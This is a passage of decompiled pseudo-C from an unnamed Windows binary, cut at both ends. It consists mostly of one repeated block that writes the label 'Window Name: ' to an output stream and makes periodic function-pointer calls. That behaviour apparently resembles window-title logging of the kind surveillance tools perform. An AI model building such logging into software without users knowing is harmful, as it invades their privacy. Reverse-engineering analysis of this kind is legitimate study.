= 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x0040306c;\n    }\n    else {\ncode_r0x0040306c:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar14 = 4;\n    uVar13 = 0;\n    uVar12 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar12, uVar13, uVar14, uVar6, uVar15, uVar16, uVar17, uVar3, uVar9\n                          , uVar10, uVar11);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x004030e4;\n    }\n    else {\ncode_r0x004030e4:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar11 = 4;\n    uVar10 = 0;\n    uVar9 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar9, uVar10, uVar11, uVar6, uVar12, uVar13, uVar14, uVar3, uVar15\n                          , uVar16, uVar17);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x0040315c;\n    }\n    else {\ncode_r0x0040315c:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar17 = 4;\n    uVar16 = 0;\n    uVar15 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar15, uVar16, uVar17, uVar6, uVar9, uVar10, uVar11, uVar3, uVar12\n                          , uVar13, uVar14);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x004031d4;\n    }\n    else {\ncode_r0x004031d4:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar14 = 4;\n    uVar13 = 0;\n    uVar12 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar12, uVar13, uVar14, uVar6, uVar15, uVar16, uVar17, uVar3, uVar9\n                          , uVar10, uVar11);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x0040324c;\n    }\n    else {\ncode_r0x0040324c:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar11 = 4;\n    uVar10 = 0;\n    uVar9 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar9, uVar10, uVar11, uVar6, uVar12, uVar13, uVar14, uVar3, uVar15\n                          , uVar16, uVar17);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x004032c4;\n    }\n    else {\ncode_r0x004032c4:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar17 = 4;\n    uVar16 = 0;\n    uVar15 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar15, uVar16, uVar17, uVar6, uVar9, uVar10, uVar11, uVar3, uVar12\n                          , uVar13, uVar14);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x0040333c;\n    }\n    else {\ncode_r0x0040333c:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar14 = 4;\n    uVar13 = 0;\n    uVar12 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar12, uVar13, uVar14, uVar6, uVar15, uVar16, uVar17, uVar3, uVar9\n                          , uVar10, uVar11);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x004033b4;\n    }\n    else {\ncode_r0x004033b4:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar11 = 4;\n    uVar10 = 0;\n    uVar9 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar9, uVar10, uVar11, uVar6, uVar12, uVar13, uVar14, uVar3, uVar15\n                          , uVar16, uVar17);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x0040342c;\n    }\n    else {\ncode_r0x0040342c:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar17 = 4;\n    uVar16 = 0;\n    uVar15 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar15, uVar16, uVar17, uVar6, uVar9, uVar10, uVar11, uVar3, uVar12\n                          , uVar13, uVar14);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x004034a4;\n    }\n    else {\ncode_r0x004034a4:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar14 = 4;\n    uVar13 = 0;\n    uVar12 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar12, uVar13, uVar14, uVar6, uVar15, uVar16, uVar17, uVar3, uVar9\n                          , uVar10, uVar11);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x0040351c;\n    }\n    else {\ncode_r0x0040351c:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar11 = 4;\n    uVar10 = 0;\n    uVar9 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar9, uVar10, uVar11, uVar6, uVar12, uVar13, uVar14, uVar3, uVar15\n                          , uVar16, uVar17);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x00403594;\n    }\n    else {\ncode_r0x00403594:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar17 = 4;\n    uVar16 = 0;\n    uVar15 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar15, uVar16, uVar17, uVar6, uVar9, uVar10, uVar11, uVar3, uVar12\n                          , uVar13, uVar14);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x0040360c;\n    }\n    else {\ncode_r0x0040360c:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar14 = 4;\n    uVar13 = 0;\n    uVar12 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar12, uVar13, uVar14, uVar6, uVar15, uVar16, uVar17, uVar3, uVar9\n                          , uVar10, uVar11);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x00403684;\n    }\n    else {\ncode_r0x00403684:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar11 = 4;\n    uVar10 = 0;\n    uVar9 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar9, uVar10, uVar11, uVar6, uVar12, uVar13, uVar14, uVar3, uVar15\n                          , uVar16, uVar17);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x004036fc;\n    }\n    else {\ncode_r0x004036fc:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar17 = 4;\n    uVar16 = 0;\n    uVar15 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar15, uVar16, uVar17, uVar6, uVar9, uVar10, uVar11, uVar3, uVar12\n                          , uVar13, uVar14);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x00403774;\n    }\n    else {\ncode_r0x00403774:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar14 = 4;\n    uVar13 = 0;\n    uVar12 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar12, uVar13, uVar14, uVar6, uVar15, uVar16, uVar17, uVar3, uVar9\n                          , uVar10, uVar11);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x004037ec;\n    }\n    else {\ncode_r0x004037ec:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar11 = 4;\n    uVar10 = 0;\n    uVar9 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar9, uVar10, uVar11, uVar6, uVar12, uVar13, uVar14, uVar3, uVar15\n                          , uVar16, uVar17);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x00403864;\n    }\n    else {\ncode_r0x00403864:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar17 = 4;\n    uVar16 = 0;\n    uVar15 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar15, uVar16, uVar17, uVar6, uVar9, uVar10, uVar11, uVar3, uVar12\n                          , uVar13, uVar14);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x004038dc;\n    }\n    else {\ncode_r0x004038dc:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar14 = 4;\n    uVar13 = 0;\n    uVar12 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar12, uVar13, uVar14, uVar6, uVar15, uVar16, uVar17, uVar3, uVar9\n                          , uVar10, uVar11);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x00403954;\n    }\n    else {\ncode_r0x00403954:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar11 = 4;\n    uVar10 = 0;\n    uVar9 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar9, uVar10, uVar11, uVar6, uVar12, uVar13, uVar14, uVar3, uVar15\n                          , uVar16, uVar17);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x004039cc;\n    }\n    else {\ncode_r0x004039cc:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar17 = 4;\n    uVar16 = 0;\n    uVar15 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar15, uVar16, uVar17, uVar6, uVar9, uVar10, uVar11, uVar3, uVar12\n                          , uVar13, uVar14);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x00403a44;\n    }\n    else {\ncode_r0x00403a44:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar14 = 4;\n    uVar13 = 0;\n    uVar12 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar12, uVar13, uVar14, uVar6, uVar15, uVar16, uVar17, uVar3, uVar9\n                          , uVar10, uVar11);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 == -1) goto code_r0x00403ac0;\n    }\n    uVar7 = uVar3;\n    uVar3 = uVar7;\ncode_r0x00403ac0:\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    noname_4_00 = 4;\n    uVar8 = 0;\n    uVar11 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar11, uVar8, noname_4_00, uVar6, uVar12, uVar13, uVar14, uVar3, uVar15, \n                 uVar16, uVar17);\n    uVar10 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    noname_4 = 4;\n    noname_3 = 0;\n    uVar9 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar9, noname_3, noname_4, uVar10, uVar11, uVar8, noname_4_00, uVar6, uVar12\n                 , uVar13, uVar14);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar9, noname_3, noname_4, uVar10, uVar11, \n                 uVar8, noname_4_00);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar9, \n                 noname_3, noname_4);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, 